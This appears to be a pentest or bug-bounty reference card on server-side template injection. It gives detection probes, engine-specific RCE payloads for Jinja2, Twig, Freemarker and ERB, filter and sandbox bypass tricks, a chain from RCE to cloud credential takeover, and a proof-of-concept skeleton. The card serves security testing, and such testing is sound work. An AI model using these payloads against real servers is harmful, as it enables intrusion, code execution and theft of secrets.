# SSTI — Bug Knowledge Card
Classe / sous-classe: Server-Side Template Injection

Severity ceiling (CVSS): up to 10.0 — most SSTI escalates to **RCE** on the server.

🔭 SPOT TESTS
- User input rendered through a template engine: email/notification templates, report/PDF
  generators, "custom message" fields, filename→template, CMS/theme editors, error pages.
- Framework tells: Jinja2/Flask (Python), Twig/Smarty (PHP), Freemarker/Velocity (Java),
  ERB (Ruby), Handlebars/Pug (Node), Go `text/template`.

🧨 EXPLOIT TESTS
1. Polyglot probe: `${{<%[%'"}}%\` → errors/odd output hint at template parsing.
2. Math test to confirm evaluation: `{{7*7}}`, `${7*7}`, `#{7*7}`, `<%= 7*7 %>` → look for `49`.
3. Identify engine by which syntax evaluates, then escalate per engine:
   - Jinja2: `{{config}}`, `{{''.__class__.__mro__[1].__subclasses__()}}` → RCE gadget.
   - Twig: `{{_self.env.registerUndefinedFilterCallback("exec")}}...`.
   - Freemarker: `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`.
   - ERB: `<%= system("id") %>`.
4. Confirm RCE with a benign command (`id`, OOB DNS) — never destructive.

🧗 BYPASS TABLE
- Filtered `{{`/`}}`: try `{%...%}`, attribute context, or engine-specific alt delimiters.
- Blacklisted `__class__`/`__subclasses__`: use `attr()` filter, `request`, `|attr('\x5f...')`.
- Sandbox escape: known Jinja2 sandbox bypass gadgets (cycler, lipsum, namespace).
- OOB when output not reflected (blind SSTI): trigger DNS/HTTP via the RCE itself.

🔗 CHAIN MAP
- SSTI → **RCE** → read secrets/env → cloud creds → **cloud tenant takeover**.
- SSTI (no RCE, sandboxed) → read config/secret vars → auth bypass / SSRF pivot.
- SSTI in PDF/report generator → often also SSRF (engine fetches resources).

🧪 POC SKELETON
```
field = {{7*7}}   → renders 49   (evaluation confirmed)
field = {{cycler.__init__.__globals__.os.popen('id').read()}}  → uid=...  (RCE confirmed)
```

📚 REFS: PortSwigger SSTI; tplmap; James Kettle "Server-Side Template Injection".
